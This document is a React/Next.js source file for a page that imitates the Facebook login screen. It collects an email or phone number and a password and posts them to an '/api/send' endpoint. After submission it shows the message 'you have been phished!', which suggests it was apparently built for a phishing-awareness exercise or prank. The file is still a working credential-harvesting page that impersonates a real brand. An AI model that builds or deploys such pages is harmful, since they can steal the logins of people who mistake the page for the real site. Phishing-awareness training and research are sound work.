'use client';
import { useState } from 'react';

export default function Page() {
  const [formData, setFormData] = useState({
    name: '',
    password: '',
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [responseMessage, setResponseMessage] = useState('');

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>,
  ) => {
    setFormData({
      ...formData,
      [e.target.id]: e.target.value,
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setResponseMessage('');
    try {
      const response = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        const errorData = await response.json();
        console.error('Error response data:', errorData);
        throw new Error(`HTTP error! Status: ${response.status}`);
      }

      const data = await response.json();
      setResponseMessage('Log in error, you have been phished!');
      console.log('yehe');
    } catch (error) {
      console.error('Form submission error:', error);
      setResponseMessage('Noe gikk galt, vennligst prøv igjen.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-gray-100">
      <div className="flex w-full max-w-3xl flex-col items-center">
        {/* Header Section */}
        <div className="mb-10 flex flex-col items-center text-center">
          <h1 className="text-4xl font-bold text-blue-600">Facebook</h1>
          <p className="text-xl">
            Connect with friends and the world around you on Facebook.
          </p>
        </div>

        {/* Login Form Section */}
        <div className="w-full rounded-lg bg-white p-8 shadow-md md:w-1/3">
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              id="name"
              value={formData.name}
              onChange={handleChange}
              placeholder="Email address or phone number"
              className="mb-3 w-full rounded-md border border-gray-300 p-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
            <input
              type="password"
              id="password"
              value={formData.password}
              onChange={handleChange}
              placeholder="Password"
              className="mb-3 w-full rounded-md border border-gray-300 p-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full rounded-md bg-blue-600 py-3 font-medium text-white hover:bg-blue-700"
            >
              {isSubmitting ? 'Submitting...' : 'Log In'}
            </button>
          </form>
          <div className="mt-4 text-center">
            <a href="#" className="text-blue-600 hover:underline">
              Forgotten password?
            </a>
          </div>
          <div className="mt-6 flex justify-center">
            <button className="rounded-md bg-green-500 px-4 py-2 font-medium text-white hover:bg-green-600">
              Create New Account
            </button>
          </div>
          {responseMessage && (
            <div className="mt-4 text-center text-red-500">
              {responseMessage}
            </div>
          )}
        </div>
      </div>

      {/* Footer Section */}
      <div className="mt-8 text-sm text-gray-600">
        <p>
          <a href="#" className="hover:underline">
            Create a Page
          </a>{' '}
          for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
}
